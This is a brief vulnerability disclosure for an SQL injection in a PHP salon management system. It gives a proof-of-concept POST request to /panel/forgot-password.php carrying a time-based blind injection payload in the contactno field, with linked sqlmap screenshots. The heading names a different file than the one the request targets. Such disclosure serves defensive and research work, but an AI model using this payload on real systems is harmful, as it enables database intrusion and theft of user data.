### Best salon management system project in php - SQLi

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18171/best-salon-management-system-project-php.html
### Tested on: MacOs13.5 + phpstudy

# /api_patient_checkin.php（SQLi）

### Sample request POC #1

```
POST /panel/forgot-password.php HTTP/1.1
Host: localhost:8887
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

submit=1&email=1&contactno='+AND+(SELECT+3909+FROM+(SELECT(SLEEP(10)))ZwEK)+AND+'HBil'%3D'HBil
```

### sqlmap

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-154255.png "Best salon management system project in php")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-154349.png "Best salon management system project in php")

### Vulnerability code
forgot-password.php:8
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-154435.png "Best salon management system project in php")
